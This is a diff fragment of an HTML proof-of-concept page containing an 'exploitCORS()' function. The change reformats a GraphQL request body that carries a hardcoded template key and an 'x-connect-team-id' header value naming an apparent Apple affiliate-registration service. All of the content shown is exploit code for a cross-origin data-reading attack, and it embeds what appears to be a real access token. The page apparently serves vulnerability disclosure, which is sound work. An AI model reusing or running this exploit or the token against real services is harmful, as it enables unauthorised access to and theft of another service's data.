@@ -60,11 +60,8 @@ function exploitCORS() {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      "query": "query formTemplateVipQuery($key: String!) { templateToken(key: $key) { ...VIPPartnerPage_templateToken } } fragment NewSubmission_version on TemplateVersion { id name description fields { id key kind name parentId data displayOrder } } fragment VIPPartnerPage_templateToken on TemplateToken { key template { id name type slug tag { name } version { id name description ...NewSubmission_version } } }",
-      "variables": {
-        "key": "e6b57a081b7dbd02e1290eda06009687caf787bfcd151f801e37acf03f71e0c5"
-      },
-      "x-connect-team-id": "com.apple.bedrock.affiliate-registration"
+      "query":"query formTemplateVipQuery(\n  $key: String!\n) {\n  templateToken(key: $key) {\n    ...VIPPartnerPage_templateToken\n  }\n}\n\nfragment NewSubmission_version on TemplateVersion {\n  id\n  name\n  description\n  fields {\n    id\n    key\n    kind\n    name\n    parentId\n    data\n    displayOrder\n  }\n}\n\nfragment VIPPartnerPage_templateToken on TemplateToken {\n  key\n  template {\n    id\n    name\n    type\n    slug\n    tag {\n      name\n    }\n    version {\n      id\n      name\n      description\n      ...NewSubmission_version\n    }\n  }\n}\n","variables":{"key":"e6b57a081b7dbd02e1290eda06009687caf787bfcd151f801e37acf03f71e0c5"
+},"x-connect-team-id":"com.apple.bedrock.affiliate-registration"
     })
   })
   .then(r => r.text())
@@ -76,5 +73,6 @@ function exploitCORS() {
   });
 }
 </script>
+
 </body>
 </html>
